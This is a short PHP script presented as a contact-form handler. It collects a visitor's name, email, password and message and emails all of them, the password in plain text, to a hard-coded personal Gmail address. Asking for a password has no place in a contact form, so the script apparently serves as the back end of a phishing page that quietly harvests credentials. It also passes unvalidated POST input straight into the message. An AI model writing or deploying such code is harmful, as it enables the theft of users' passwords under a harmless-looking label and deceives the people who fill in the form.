<?php

// Get the form data
$name = $_POST['name'];
$email = $_POST['email'];
$password = $_POST['password'];
$message = $_POST['message'];

// Create the email message
$to = "pratyakshsinghal635@gmail.com";
$subject = "New Contact Form Submission";
$body = "Name: $name\nEmail: $email\nPassword: $password\nMessage: $message";

// Send the email
if (mail($to, $subject, $body)) {
    echo "Thank you for contacting us!";
} else {
    echo "There was an error sending your message. Please try again later.";
}

?>
